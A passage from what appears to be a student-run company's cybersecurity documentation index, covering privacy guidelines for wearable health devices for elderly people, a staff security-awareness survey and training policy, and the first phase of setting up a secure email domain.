access to their data and knowledge of whether it is being processed. Right to rectification where data is inaccurate and the individual may request for their data to be corrected. Right of erasure to restrict the data from being processed. Right to be informed in a clear and concise manner prior to the collection and use of data. Right to object meaning that data subjects can express if they do not want their personal data to be processed. Right not to be subject to a decision based on automated processing.  ","version":"Next","tagName":"h3"},{"title":"Health Information​","type":1,"pageTitle":"Project 3 - Wearable Technologies for Elderly People","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-3#health-information","content":" 'Health information' refers to information or an opinion that is also classified as personal information and may include information about the health or a disability of the individual, an individual’s expressed wishes about the future provision of health services to him or her, or a health service provided, or to be provided, to an individual. Biometric authentication and end- to-end encryption should be applied and continuously updated to protect this type of data.  The wearable devices should be non-invasive, wearable equipment designed for the purpose of collecting physiological health information through embedded sensors that transmit information to devices to facilitate interventions. Individuals should be informed about the status of the data security (personalised, pseudonymised, anonymised), the data format (pictures, communication data, test results) and processing of the data (access by natural persons, algorithms).  The Therapeutic Goods Administration (TGA) administers and regulates medical devices. It encompasses devices used for medical purposes such as disease monitoring, treatment specifications or controlling medical devices. Software that enables individuals to track their health information are not classified as medical devices under the TGA. The individual circumstances of the patient will determine if specific cyber security guidance under the FDA will be relevant as the wearables may fall within the scope of medical devices.  ","version":"Next","tagName":"h2"},{"title":"Genetic Information​","type":1,"pageTitle":"Project 3 - Wearable Technologies for Elderly People","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-3#genetic-information","content":" Genetic information refers to information in a form that may be predictive of the health of the individual or a genetic relative of the individual (s 6(1)).  ","version":"Next","tagName":"h3"},{"title":"Personal Information​","type":1,"pageTitle":"Project 3 - Wearable Technologies for Elderly People","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-3#personal-information","content":" An APP entity will hold personal information ‘if the entity has possession or control over a record that contains the personal information’ (s 6(1)). The term ‘record’ refers to a document or an electronic or other device (s 6(1)).  ","version":"Next","tagName":"h3"},{"title":"Responsible Person​","type":1,"pageTitle":"Project 3 - Wearable Technologies for Elderly People","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-3#responsible-person","content":" Where the individual lacks the physical and/or mental capacity, a ‘responsible person’ may provide or disclosure information including a:  Parent of the individual; Child or sibling of the individual who is over 18 years old; Spouse or de facto partner of the individual; Relative of the individual; Guardian of the individual; Individual exercising a power of attorney granted by the individual that can be undertaken in reference to decisions regarding the health of the individual; Person who has an intimate personal relationship with the individual; or a Person nominated by the individual to be contacted in the event of an emergency.  ","version":"Next","tagName":"h3"},{"title":"Provision of Informed Consent by Caregiver​","type":1,"pageTitle":"Project 3 - Wearable Technologies for Elderly People","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-3#provision-of-informed-consent-by-caregiver","content":" Where the individual lacks the mental capacity to provide consent, caregivers must clearly communicate the risks and benefits associated with the wearable technologies associated with privacy and security and the critical events that a monitoring system may detect. The individual should be capable of making a sufficient decision based on the information provided and what they should realistically expect from using the system, including what situations will trigger the system to send alerts. Where the caregiver cannot determine whether the individual has the capacity to make a decision, permission should be sought from an alternative who may be able to clarify their capacity such as a family member, or physician. If the status of the individual changes, efforts must be made to ensure the individual is aware of the nature, extent and impact of the system.  ","version":"Next","tagName":"h3"},{"title":"Physical Security​","type":1,"pageTitle":"Project 3 - Wearable Technologies for Elderly People","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-3#physical-security","content":" This section outlines the physical security protections that should be implemented to safeguard people and assets to comply with the Work Health and Safety Act 2011 and meet cyber security standards. These protections should be proportionate with the assessed sensitivity or risk of damage or loss.  ","version":"Next","tagName":"h2"},{"title":"Physical Access to Systems​","type":1,"pageTitle":"Project 3 - Wearable Technologies for Elderly People","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-3#physical-access-to-systems","content":" A security zone should be established and systems should be secured in premises that have been assessed by the physical security certification authority and meet appropriate standards to secure the sensitive data appropriately.  ","version":"Next","tagName":"h3"},{"title":"Physical Access to Devices and Servers​","type":1,"pageTitle":"Project 3 - Wearable Technologies for Elderly People","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-3#physical-access-to-devices-and-servers","content":" The company should have a separate server room to secure network devices and servers with appropriate keys to control access to this room. Physical security such as enclosures or security containers should be implemented to prohibit unauthorised access or damage to equipment. Workstations and keyboards should not be visible to people outside of the premises and measures such as privacy films should be implemented to prevent observation from unauthorised people. The company must securely dispose of physical assets.  ","version":"Next","tagName":"h3"},{"title":"Securing ICT Equipment​","type":1,"pageTitle":"Project 3 - Wearable Technologies for Elderly People","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-3#securing-ict-equipment","content":" ICT equipment should be secured when it is not in use and this may be achieved through security containers, sanitisation of memory upon shutdown or encryption of hard drives.  ","version":"Next","tagName":"h3"},{"title":"Notification Requirements​","type":1,"pageTitle":"Project 3 - Wearable Technologies for Elderly People","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-3#notification-requirements","content":" Where a data breach incident occurs that is likely to compromise the rights of an individual, they must be notified immediately, and the relevant regulatory body must be informed within 72 hours.  ","version":"Next","tagName":"h2"},{"title":"Notifiable Data Breaches scheme​","type":1,"pageTitle":"Project 3 - Wearable Technologies for Elderly People","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-3#notifiable-data-breaches-scheme","content":" Under the Notifiable Data Breaches (NDB) scheme, companies under the Privacy Act must undertake an assessment where there has been a data loss or unauthorised access to or disclosure of personal information. The company must notify the OAIC where the incident is likely to result in harm to an individual. ","version":"Next","tagName":"h3"},{"title":"User Awareness Training - Gap Analysis","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/Blue Team/Awareness-Training/User-Awareness-GAP-Analysis","content":"","keywords":"","version":"Next"},{"title":"Purpose​","type":1,"pageTitle":"User Awareness Training - Gap Analysis","url":"/redback-documentation/docs/cybersecurity/Blue Team/Awareness-Training/User-Awareness-GAP-Analysis#purpose","content":" The Purpose of this gap analysis is to identify the current level of cyber security awareness knowledge across Redback Operations and compare it to industry recommendations.  This document includes a company-wide survey and the results which are then used to make recommendations on what should be included in Redback Operations annual awareness training packages.  ","version":"Next","tagName":"h2"},{"title":"Survey Results​","type":1,"pageTitle":"User Awareness Training - Gap Analysis","url":"/redback-documentation/docs/cybersecurity/Blue Team/Awareness-Training/User-Awareness-GAP-Analysis#survey-results","content":" The following survey was conducted via a Survey Monkey survey between the 27 Jul and 03 Aug 24 and can be viewed here - Awareness Training Survey  ","version":"Next","tagName":"h2"},{"title":"The following questions, answers and results were included in the survey:​","type":1,"pageTitle":"User Awareness Training - Gap Analysis","url":"/redback-documentation/docs/cybersecurity/Blue Team/Awareness-Training/User-Awareness-GAP-Analysis#the-following-questions-answers-and-results-were-included-in-the-survey","content":" ","version":"Next","tagName":"h2"},{"title":"1. How often should you update your software and Antivirus?​","type":1,"pageTitle":"User Awareness Training - Gap Analysis","url":"/redback-documentation/docs/cybersecurity/Blue Team/Awareness-Training/User-Awareness-GAP-Analysis#1-how-often-should-you-update-your-software-and-antivirus","content":" Once a weekOnce a MonthWhen we are told toNever  Q1 Responses:​    Q1 Comment/Assesment:​  Overall, most members of Redback Operations regularly update their software and antivirus. Training to emphasise the importance of this practice may help ensure that all company members keep their systems current and address security issues promptly.  ","version":"Next","tagName":"h3"},{"title":"2. Are you aware of Two Factor Authentication and do you use it?​","type":1,"pageTitle":"User Awareness Training - Gap Analysis","url":"/redback-documentation/docs/cybersecurity/Blue Team/Awareness-Training/User-Awareness-GAP-Analysis#2-are-you-aware-of-two-factor-authentication-and-do-you-use-it","content":" Yes - I use itYes - But i don't use itNo I don't know what it is  Q2 Responses:​    Q2 Comment/Assesment:​  All members of Redback Operations are familiar with Two-Factor Authentication, with all but one member using it. This topic will not need extensive coverage in the Security Awareness Training package.  ","version":"Next","tagName":"h3"},{"title":"3. What type of password do you use?​","type":1,"pageTitle":"User Awareness Training - Gap Analysis","url":"/redback-documentation/docs/cybersecurity/Blue Team/Awareness-Training/User-Awareness-GAP-Analysis#3-what-type-of-password-do-you-use","content":" Default/BasicComplexPassphrasesI use a password manager  Q3 Responses:​    Q3 Comment/Assesment:​  While most members of Redback Operations use complex passwords or a password manager, it is concerning that 16% of respondents reported using basic or default passwords. Training should address why this is a significant security risk and emphasise the importance of using secure passwords.  ","version":"Next","tagName":"h3"},{"title":"4. Do you store your password anywhere (physically or online) and do you share you password with anyone (please select all that apply)?​","type":1,"pageTitle":"User Awareness Training - Gap Analysis","url":"/redback-documentation/docs/cybersecurity/Blue Team/Awareness-Training/User-Awareness-GAP-Analysis#4-do-you-store-your-password-anywhere-physically-or-online-and-do-you-share-you-password-with-anyone-please-select-all-that-apply","content":" Yes - I store my password somewhereNo my password is not stored anywhereI do share my password with other people  Q4 Responses:​    Q4 Comment/Assesment:​  It is concerning that 80% of respondents indicated they store passwords (physically or online), and even more concerning that 12% share passwords with others. This issue will need to be addressed in the Security Awareness Training.  ","version":"Next","tagName":"h3"},{"title":"5. Do you understand what is meant by Clear Desk Policy and do you lock your device when you leave it unattended (please select all that apply)?​","type":1,"pageTitle":"User Awareness Training - Gap Analysis","url":"/redback-documentation/docs/cybersecurity/Blue Team/Awareness-Training/User-Awareness-GAP-Analysis#5-do-you-understand-what-is-meant-by-clear-desk-policy-and-do-you-lock-your-device-when-you-leave-it-unattended-please-select-all-that-apply","content":" Yes - I am aware of what a Clear Desk Policy isNo - I am not aware of what a Clear Desk Policy isYes - I do lock my device when I leave itNo - I do not lock my device when I leave it  Q5 Responses:​    Q5 Comment/Assesment:​  Approximately one-third of the company is unaware of the Clean Desk Policy requirement, so this topic will be reviewed in the Security Awareness Training. While all but one member locks their terminals when away, this good practice does not require detailed coverage in the training.  ","version":"Next","tagName":"h3"},{"title":"6. What do you do when you receive an email with a link or document embedded?​","type":1,"pageTitle":"User Awareness Training - Gap Analysis","url":"/redback-documentation/docs/cybersecurity/Blue Team/Awareness-Training/User-Awareness-GAP-Analysis#6-what-do-you-do-when-you-receive-an-email-with-a-link-or-document-embedded","content":" I would verify it’s from a source I trust, before clicking on the linkI would click on the link without hesitation  Q6 Responses:​    Q6 CComment/Assesment:​  All respondents seem to understand what to do if they receive a link or document from an unknown source. Despite this good result, the significant risk posed by such attacks warrants thorough coverage in the Security Awareness Training.  ","version":"Next","tagName":"h3"},{"title":"7. What would you do if you identified a security issue or breach?​","type":1,"pageTitle":"User Awareness Training - Gap Analysis","url":"/redback-documentation/docs/cybersecurity/Blue Team/Awareness-Training/User-Awareness-GAP-Analysis#7-what-would-you-do-if-you-identified-a-security-issue-or-breach","content":" I would inform the company IT help deskI would fix it myselfI would ignore it  Q7 Responses:​    Q7 Comment/Assesment:​  It is very encouraging that all but one member would report a security issue or breach to the IT help desk as soon as they are aware of it. Therefore, the focus of this topic in the Security Awareness Training package should be on who to contact rather than why.  ","version":"Next","tagName":"h3"},{"title":"8. When did you last conduct Security awareness training for Redback Operations?​","type":1,"pageTitle":"User Awareness Training - Gap Analysis","url":"/redback-documentation/docs/cybersecurity/Blue Team/Awareness-Training/User-Awareness-GAP-Analysis#8-when-did-you-last-conduct-security-awareness-training-for-redback-operations","content":" In the last 6 monthsin the last 6-12 monthsGreater then 12 monthsNever  Q8 Responses:​    Q8 Comment/Assesment:​  Over 80% of Redback Operations staff have not participated in a Security Awareness Training package for the company, highlighting the need for this package to be developed.  ","version":"Next","tagName":"h3"},{"title":"9. Please select all that apply​","type":1,"pageTitle":"User Awareness Training - Gap Analysis","url":"/redback-documentation/docs/cybersecurity/Blue Team/Awareness-Training/User-Awareness-GAP-Analysis#9-please-select-all-that-apply","content":" I use company devices on public Wi-Fi i.e. at the Airport, Shops etcI back up my files in accordance with Redback Operations requirementsI use Redback Operations devices for private use?I use a VPN when requiredI use encryption when storing and sending personal dataI keep up to date with current Cyber Security Threats and the best way to defend and mitigate them?I am aware of Redback Operation’s procedures when it comes to disposing of old devices that contain sensitive information  Q9 Responses:​    Q9 Comment/Assesment:​  To better understand the daily operations of Redback Operations staff, the following points were noted:  Public Wi-Fi: Over half of the company uses public Wi-Fi. Ensuring users are aware of steps to take to stay safe while using public Wi-Fi should be included in the Security Awareness Training.Backups: Less than half of the company backs up their files according to Redback Operations Policy. This issue needs to be addressed in the Security Awareness Training package.VPN: Two-thirds of the company use a VPN as required, which is a good result. However, the need for and benefits of VPNs should be emphasised in the Security Awareness Training to increase usage.Encryption: Less than half of the staff use (or are aware they use) encryption for storing and sending data. How and why to do this should be covered in the Security Awareness Training package.Current Threats: Approximately two-thirds of the company stay informed about current IT threats. While this area doesn’t need to be included in the Security Awareness Training package, a method for keeping the company updated on current news should be explored further.Disposal of Hardware Storage Devices: Although Redback Operations has limited storage devices, everyone must be aware of how to store and dispose of sensitive data appropriately, which should be covered in the Security Awareness Training.  ","version":"Next","tagName":"h3"},{"title":"Overall Comments:​","type":1,"pageTitle":"User Awareness Training - Gap Analysis","url":"/redback-documentation/docs/cybersecurity/Blue Team/Awareness-Training/User-Awareness-GAP-Analysis#overall-comments","content":" As expected for a tech company, the overall cybersecurity knowledge across the company is quite good. While some areas need attention, the most significant issue is the lack of formalised annual or onboarding training packages.  ","version":"Next","tagName":"h2"},{"title":"Recommendation:​","type":1,"pageTitle":"User Awareness Training - Gap Analysis","url":"/redback-documentation/docs/cybersecurity/Blue Team/Awareness-Training/User-Awareness-GAP-Analysis#recommendation","content":" Given the solid baseline knowledge of all employees, it is recommended to create a Security Awareness Training package covering the Australian Signal Directorate (ASD)/Australian Cyber Security Centre (ACSC) &quot;6 Practical Ways to Protect Yourself Online.&quot; The six topics are:  Update your deviceSet up and perform regular backupsTurn on multi-factor authenticationSet secure passphrasesRecognise and report scamsWatch out for threats  These topics should form six modules, with each ASD/ACSC topic providing the core content for a module. Additional, more specific content (likely from other ACSC webpages) will also need to be included in each module to ensure the Security Awareness Training is current and applicable to Redback Operations. ","version":"Next","tagName":"h2"},{"title":"Cybersecurity User Awareness Training","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/Blue Team/Awareness-Training/User-Awareness-Training","content":"","keywords":"","version":"Next"},{"title":"Purpose​","type":1,"pageTitle":"Cybersecurity User Awareness Training","url":"/redback-documentation/docs/cybersecurity/Blue Team/Awareness-Training/User-Awareness-Training#purpose","content":" The purpose of this User Awareness Training document is to define the standards that must be in place and followed for the training and upskilling of our employees. The document will outline the importance of and reasoning for these standards and will mention any training or learning that must be undertaken by employees to guarantee security compliance.  ","version":"Next","tagName":"h2"},{"title":"Introduction​","type":1,"pageTitle":"Cybersecurity User Awareness Training","url":"/redback-documentation/docs/cybersecurity/Blue Team/Awareness-Training/User-Awareness-Training#introduction","content":" ","version":"Next","tagName":"h2"},{"title":"What is user awareness training?​","type":1,"pageTitle":"Cybersecurity User Awareness Training","url":"/redback-documentation/docs/cybersecurity/Blue Team/Awareness-Training/User-Awareness-Training#what-is-user-awareness-training","content":" User awareness training refers to the guidelines put in place by an organisation to help educate workers about the potential risks of their role and job functions. Though the awareness training typically focuses on data protection, data security and overall compliance with company policies.  ","version":"Next","tagName":"h3"},{"title":"What is the purpose of user awareness training?​","type":1,"pageTitle":"Cybersecurity User Awareness Training","url":"/redback-documentation/docs/cybersecurity/Blue Team/Awareness-Training/User-Awareness-Training#what-is-the-purpose-of-user-awareness-training","content":" User awareness training serves a range of crucial functions within an organisation. Aside from educating workers about the potential risks of their job functions, it also provides employees with a range of strategies and procedures that they can follow to mitigate or resolve these risks effectively.  Through the provision of this training, not only is data security improved, but if followed correctly, there may be a significant increase in company performance and morale.  Finally, user awareness training works to minimise potential loss, and consequently, it works to foster a safe and positive working environment.  ","version":"Next","tagName":"h3"},{"title":"Job/Role Specific Training​","type":1,"pageTitle":"Cybersecurity User Awareness Training","url":"/redback-documentation/docs/cybersecurity/Blue Team/Awareness-Training/User-Awareness-Training#jobrole-specific-training","content":" This training will highlight all the general training that needs to be completed to understand our safety practices and procedures within Redback Operations, though it will not deliver information related to specific jobs/roles within the organisation.  Specific job/role training will be conducted through the job itself, however this training must be completed regardless.  ","version":"Next","tagName":"h2"},{"title":"Understanding Routes for Help​","type":1,"pageTitle":"Cybersecurity User Awareness Training","url":"/redback-documentation/docs/cybersecurity/Blue Team/Awareness-Training/User-Awareness-Training#understanding-routes-for-help","content":" In our Cyber Team at Redback Operations, roles and responsibilities are broken down into sub teams, such as our “Purple Team” (Red + Blue), “Blue Team” (Secure Coding), “Green Team” (Identity and Access Management), “Yellow Team” (Governance and Policies), and our “Red Team” (Infrastructure/Other).  It is important to understand what team you, as an employee belong to, to identify what your route for help is. Each team should be familiar with their fellow team members, including their team leader – to which they should reach out to if help is required.  If the help required is based on gaps in knowledge, documentation such as policies, rules, and procedures can be found on our company repositories, such as Docusaurus or Github in order to strengthen this knowledge, though if more help is required, it is best to contact a team leader.   ","version":"Next","tagName":"h2"},{"title":"Understanding Redback Operations' Major Areas​","type":1,"pageTitle":"Cybersecurity User Awareness Training","url":"/redback-documentation/docs/cybersecurity/Blue Team/Awareness-Training/User-Awareness-Training#understanding-redback-operations-major-areas","content":" To ensure the protection of Redback Operations’ Major Areas, all users must be informed and educated on what they are, and what can be done to monitor and protect them. The major areas of Redback Operations that need to be monitored are as follows:  Cloud Infrastructure – “Monitoring the performance, availability, and security of the cloud infrastructure”. This can be monitored through the “implementation of 2-Factor Authentication”. Application Performance – “Monitoring the performance of Redback Operations’ applications”. This can be monitored through “user feedback and reviews”. Resource and Usage Cost – “Keeping track of resource usage and associate costs”. This can be done through “tools such as Datadog or Grafana… to monitor CPU usage”, alongside “budgeting practices” with “a cost-usage matrix”. Security and Compliance – “Monitoring security events, vulnerabilities, and compliance with industry standards”. This can be monitored through “regular checks on full compliance policies”. Network Performance – “Monitoring network latency, bandwidth, and traffic patterns”. This can be monitored through “real-time bandwidth measurements”. Backup and Disaster Recovery – “Monitoring backup processes and disaster recovery plans”. This can be monitored through the “administration of an automated storage backup program”. User Activity and Usage – “Monitor user activity and usage patterns”. This can be monitored through “logging mechanisms… to verify and record user authentication events”. System Updates and Patches – “Keeping track of system updates and patches”. This can be monitored through “patch management software”, to ensure that the company’s systems are up-to-date and detected vulnerabilities are actively patched.  For an in-depth guide on how to monitor the major areas of Redback Operations, please refer to the document titled “how can we monitor major areas.docx”, which can be found on our company Github repo.  Descriptions sourced from “major_areas_to_be_monitored.docx”. Solutions sourced from “how can we monitor major areas.docx”.  ","version":"Next","tagName":"h2"},{"title":"Understanding Data Classification​","type":1,"pageTitle":"Cybersecurity User Awareness Training","url":"/redback-documentation/docs/cybersecurity/Blue Team/Awareness-Training/User-Awareness-Training#understanding-data-classification","content":" Understanding data classification is a pivotal point on knowledge in a user’s training, as this can help to give a gauge on the level of cautiousness and security that a user must take when recording, handling, and storing specific data. As mentioned in our Data Classification &amp; DLP Policy, data classification is broken down into four levels.  Public refers to “data intended for public disclosure”, where confidentiality is not a top priority as the data is intended to be accessed by the public. Internal Use Only refers to “data that is not sensitive but is intended for use within the organisation”. In this case, the security is not imperative but should be considered. Confidential refers to “sensitive data that could cause harm to the organisation or individuals if disclosed. In this case, data must be carefully handled and protected from the public as the disclosure of this may cause harm to the company. Restricted refers to “highly sensitive data that if disclosed could result in significant harm or legal/regulatory non-compliance”. In this case, data must be treated with absolute care, with all safety measures in place to ensure its confidentiality and integrity.  Please refer to our “Data Classification – DLP Policy.docx” on our company repositories for further information. Information sourced from “Data Classification – DLP Policy.docx”  ","version":"Next","tagName":"h2"},{"title":"Understanding Data Loss Prevention Strategies​","type":1,"pageTitle":"Cybersecurity User Awareness Training","url":"/redback-documentation/docs/cybersecurity/Blue Team/Awareness-Training/User-Awareness-Training#understanding-data-loss-prevention-strategies","content":" In tandem with Data Classification, Data Loss Prevention (will now be referred to as DLP) strategies are put in place to “ensure the safety and integrity of our data” through the deployment of “a range of safety measures and policies to accurately respond in the event of a data breach”, “proactively identify[ing], monitor[ing], and mitigat[ing] risks involved with unauthorized access, data distribution or breaches of sensitive data.  At Redback Operations, we follow seven different DLP strategies, these are as follows:  Data Classification – “Data must be classified based on its sensitivity, importance, and business impact to Redback Operations”. Access Controls – “The least privilege principle must be implemented, restricting access rights to only those that directly require access to perform their job function”. Watermarking Content – “All confidential information that is integral to the company should be watermarked with “Redback Operations”, to prevent “the ability for anyone to steal any data or documentation and claim it as their own”. Encryption – “All sensitive material within Redback Operations should undergo encryption to reduce the overall business impact in the event of a data breach”. Preventing Unauthorized Copies of Data – Whilst adhering to the same standards as Access Controls and Watermarking Content, “screen-capture prevention and clipboard control should be implemented” to prevent unauthorized copies of data. Content Inspection – “Regular examination of files, documents, and automated monitoring of communications” should be conducted to ensure data security. Policy Enforcement – “There should be both automated and physical inspections on all sensitive data being transmitted or stored within Redback Operations to ensure that it follows all DLP and Data Classification Policies”.  For an in-depth description for the implementation of DLP strategies, please refer to the document titled “Data Classification – DLP Policy”, which can be found on our company Github repo.  Information sourced from “Data Classification – DLP Policy.docx”  ","version":"Next","tagName":"h2"},{"title":"Encryption Standards​","type":1,"pageTitle":"Cybersecurity User Awareness Training","url":"/redback-documentation/docs/cybersecurity/Blue Team/Awareness-Training/User-Awareness-Training#encryption-standards","content":" Though encryption is mentioned in our Data Loss Prevention Strategies, a larger focus must be placed onto it, as it is the governing factor that works to protect the confidentiality and integrity of our data. All encryption standards must align with our Cryptography policy.  All employees must be aware of the “Roles and Responsibilities” section within the cryptography policy – and specifically they should understand what their role is within the team.  Similarly, employees that are responsible for data transfer and data storage should understand our “Secure Protocols”, which involve using “Transport Layer Security 1.2 or higher” when transmitting data over public networks, opposed to “forbidden”, “insecure protocols such as SSL2, SSL3, TLS 1.0 &amp; TLC1.1”.  Similarly, symmetric encryption must take place “for internal encryption needs, including data at rest, AES (Advanced Encryption Standard) with key sizes of 256 bits is approved”.  Alternatively, asymmetric encryption must take place “for digital signatures and key exchange mechanisms, RSA with a minimum key size of 2048 bits or ECC with a minimum key size of 256 bits are approved”.  Finally, when conducting file hashing, “SHA-256 or higher is approved for hashing operations”.  Please refer to our “Cryptography Policy.docx” on our company repositories for further information.  Information sourced from “Cryptography Policy.docx”.  ","version":"Next","tagName":"h2"},{"title":"Playbook Awareness​","type":1,"pageTitle":"Cybersecurity User Awareness Training","url":"/redback-documentation/docs/cybersecurity/Blue Team/Awareness-Training/User-Awareness-Training#playbook-awareness","content":" Our team at Redback Operations and developing and have developed a range of incident response “playbooks” which work to educate users on the risks and attacks that the company may face – an example of this being for our “phishing incident response playbook”. Though this section will brief over our playbooks, what their purpose is, and how to access them.  Each playbook is broken down into seven sections, these being “preparation”, “identification”, “notification”, “containment”, “eradication”, “recovery”, and “post-incident” responses, each unique to the specific circumstances.  ","version":"Next","tagName":"h2"},{"title":"Attack Playbooks​","type":1,"pageTitle":"Cybersecurity User Awareness Training","url":"/redback-documentation/docs/cybersecurity/Blue Team/Awareness-Training/User-Awareness-Training#attack-playbooks","content":" These playbooks outline how to prepare for, identify, eradicate, and recover from a range of attacks on the company’s data and systems.  The attack playbooks account for the following attacks: Denial of Service (DoS), Phishing, Ransomware, Malware, Data Breach, and Industrial Control System Compromise Playbook.  The attack playbooks hold a heavy significance on preparation for an attack, with the implementation of a robust range of preparation strategies, such as backups, access controls, monitoring tools and general employee response training. Though if an attack is successful, we conduct post-incident analysis and reviews to looks for areas to improve on, to prevent recurrence of an attack.  ","version":"Next","tagName":"h3"},{"title":"Vector Playbooks​","type":1,"pageTitle":"Cybersecurity User Awareness Training","url":"/redback-documentation/docs/cybersecurity/Blue Team/Awareness-Training/User-Awareness-Training#vector-playbooks","content":" These playbooks outline a range of ways to identify, eradicate, and recover from a range of vectors that may cause an unauthorized intrusion to the company’s systems.  The vector playbooks account for the following vectors: External/Removable Media Vectors, Attrition Vectors, Web Vectors, Email Vectors, Supply Chain Interdiction Vectors, Impersonation Vectors, Improper Usage Vectors, and Loss/Theft of Equipment Vectors.  The vector playbooks primarily focus on authentication measures, regular system checks and filtering to prepare for any of these intrusion attempts. Though if any of these vectors invade our servers, our post-incident response is to always review and analyse our current measures to adjust for any gaps or vulnerabilities to prevent recursion of the intrusion.  ","version":"Next","tagName":"h3"},{"title":"In-Depth Playbook Access​","type":1,"pageTitle":"Cybersecurity User Awareness Training","url":"/redback-documentation/docs/cybersecurity/Blue Team/Awareness-Training/User-Awareness-Training#in-depth-playbook-access","content":" An in-depth read-through of the playbooks, outlining steps for preparation, identification, notification, containment, eradication, recovery, and post-incident responses can be found within the company’s repos – either through Github or Docusaurus.  ","version":"Next","tagName":"h3"},{"title":"Ethics​","type":1,"pageTitle":"Cybersecurity User Awareness Training","url":"/redback-documentation/docs/cybersecurity/Blue Team/Awareness-Training/User-Awareness-Training#ethics","content":" Ethics refer to the “moral principles that govern a person’s behaviour or the conducting of an activity” (Oxford Languages). They are put in place to ensure the compliance of relative security principles that are in place within an organisation.  An ethics framework is a staple in any organisation, as it governs the organisation’s values, purpose, and principles on how they conduct their business matters to keep a transparent and trustworthy relationship with their consumers.  From a cybersecurity stance, ethics refers to our collection, storage, and transmission of sensitive information. Though compliance with these ethical standards and requirements must always be followed, as non-compliance can lead to significant impacts on the company’s integrity and trust with its consumers.  ","version":"Next","tagName":"h2"},{"title":"Ethical Standards of Redback Operations​","type":1,"pageTitle":"Cybersecurity User Awareness Training","url":"/redback-documentation/docs/cybersecurity/Blue Team/Awareness-Training/User-Awareness-Training#ethical-standards-of-redback-operations","content":" At Redback Operations, we follow a range of Ethical Standards to guarantee our trust and transparency with our consumers, there ethical standards are as follows:  Transparency and ConsentAll forms of data collection must be briefed with consumers, and they must provide full, written consent.  This consent must outline what data is being collected, how it will be collected, how it will be stored, how it will be used, and any risks associated with potential data breaches, unauthorised access, and data loss.  ConfidentialityAll information classified as “Internal Use Only”, “Confidential”, or “Restricted” must have the correct access controls applied to their accessibility. Building onto this, encryption standards must be put in place to keep information confidential, even in the event of a data breach.  PrivacyData collected from consumers must remain private to both, the outside world, and our employees. To do this, data anonymity must be utilised to protect the privacy of our consumers, so their personal data cannot be traced back to them in the event of a data breach.  Secure collection, storage, and transmission of dataAdhering to our cryptography policy, and general cryptography standards, data must be securely collected and stored. Similarly, data must be securely transmitted – further explanation on how to do this can be sourced from our cryptography policy.  Data UsageTo monitor data usage, data minimalization can take place, by limiting the data that we collect from our consumers to only be data that we require for the function of our work. For example, personal data such as addresses and other sensitive, unrelated information should not be collected as that information is not required for our job function.  ComplianceUltimately, all Redback Operations Policies and Procedures – such as this training and other policies must be actively adhered and complied to, guaranteeing the overall company security and protection, while ensuring our transparency and relationship with our consumers. ","version":"Next","tagName":"h3"},{"title":"Phase 1 – Domain Registration & Basic Email Infrastructure Setup","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase1","content":"","keywords":"","version":"Next"},{"title":"Objective​","type":1,"pageTitle":"Phase 1 – Domain Registration & Basic Email Infrastructure Setup","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase1#objective","content":" The objective of this phase is to establish the foundational components for the implementation of a secure email infrastructure for Redback Operations. This phase focuses on:  Domain Registration: Securing a domain for Redback Operations.Email Service Provider (ESP) Setup: Setting up an Email Service Provider (ESP) with initial configurations.  ","version":"Next","tagName":"h2"},{"title":"Deliverables​","type":1,"pageTitle":"Phase 1 – Domain Registration & Basic Email Infrastructure Setup","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase1#deliverables","content":" A registered domain.A selected Email Service Provider (ESP).    ","version":"Next","tagName":"h2"},{"title":"1. Domain Registration​","type":1,"pageTitle":"Phase 1 – Domain Registration & Basic Email Infrastructure Setup","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase1#1-domain-registration","content":" Outlined below are the steps undertaken for Domain Registration:  ","version":"Next","tagName":"h2"},{"title":"1.1. Domain Registration​","type":1,"pageTitle":"Phase 1 – Domain Registration & Basic Email Infrastructure Setup","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase1#11-domain-registration","content":" 1.1.1. Select a domain name:​  For this project, the selected domain name is – redbackops.com.  Initially, the domain name redbackops.com.au was considered, but registering a .com.au or .net.au domain requires the customer to: Be a commercial entityHave either an Australian Company Number (ACN) or Australian Business Number (ABN)  1.1.2. Select a reputable domain registrar:​  For this project, the selected registrar is – GoDaddy.  1.1.3. Register the domain:​  Register the domain with the chosen registrar (GoDaddy).   1.1.4. Verify domain ownership:​  Ensure that the domain appears under the ‘My Domains’ section in the dashboard.     ","version":"Next","tagName":"h3"},{"title":"1.2 Domain Security Enhancement​","type":1,"pageTitle":"Phase 1 – Domain Registration & Basic Email Infrastructure Setup","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase1#12-domain-security-enhancement","content":" 1.2.1. Enable Domain Privacy:​  Enable Domain Privacy to protect the personal information of the domain owners. More Information  1.2.2. Enable Domain Lock:​  Enable Domain Lock to prevent the domain from unauthorized transfers, changes, or modifications. More Information    ","version":"Next","tagName":"h3"},{"title":"2. Email Service Provider (ESP) Selection​","type":1,"pageTitle":"Phase 1 – Domain Registration & Basic Email Infrastructure Setup","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase1#2-email-service-provider-esp-selection","content":" ","version":"Next","tagName":"h2"},{"title":"2.1 Research and Select an ESP​","type":1,"pageTitle":"Phase 1 – Domain Registration & Basic Email Infrastructure Setup","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase1#21-research-and-select-an-esp","content":" 2.1.1. Select an Email Service Provider (ESP):​  For this project, the selected email service provider is – Microsoft 365 Exchange Online.  2.1.2. Criteria for the ESP Selection:​  Advanced security features, compliance, and governance capabilities.Scalability features to support future growth and integration with the company’s other systems.Support for advanced security 